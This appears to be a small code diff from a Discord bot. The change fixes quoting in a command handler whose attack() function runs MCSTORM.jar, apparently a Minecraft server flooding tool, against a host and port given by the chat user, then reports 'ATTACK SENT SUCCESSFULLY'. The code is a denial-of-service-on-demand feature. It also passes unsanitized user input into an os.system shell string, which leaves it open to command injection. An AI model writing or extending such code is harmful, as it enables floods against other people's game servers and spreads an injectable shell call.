@@ -679,7 +679,7 @@ async def joinmotd(ctx, arg1, arg2):
         pass
     else:
         def attack():
-            os.system(f"java -Dprefix="DreamBot" -Dperdelay=5000 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1} {arg2} multikiller 60 -1")
+            os.system(f'java -Dprefix="DreamBot" -Dperdelay=5000 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1} {arg2} multikiller 60 -1')
             os.system(f"")
 
         embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)
